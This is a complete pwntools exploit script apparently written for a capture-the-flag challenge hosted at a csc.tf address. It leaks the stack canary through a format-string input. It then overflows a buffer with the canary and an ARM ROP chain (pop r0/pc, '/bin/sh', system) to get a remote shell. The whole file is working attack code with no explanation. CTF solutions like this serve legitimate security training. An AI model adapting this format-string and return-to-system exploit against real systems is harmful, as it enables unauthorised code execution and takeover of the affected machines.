from pwn import *

r = remote("shelltesterv2.challs.csc.tf", 1337)

sla = r.sendlineafter

system = 0x17368
pop_r0_pc = 0x6F25C  # pop {r0, pc}
binsh = 0x72688

# leak canary
sla(b"Tell me something: \n", b"%43$p")
canary = int(r.recvline()[2:-1], 16)
log.info(f"canary: {hex(canary)}")

# get shell
payload = b"A" * 0x64
payload += p32(canary)
payload += b"A" * 0x4
payload += p32(pop_r0_pc)
payload += p32(binsh)
payload += p32(system)
sla(b"Do you want to say something before you leave?\n", payload)

r.interactive()
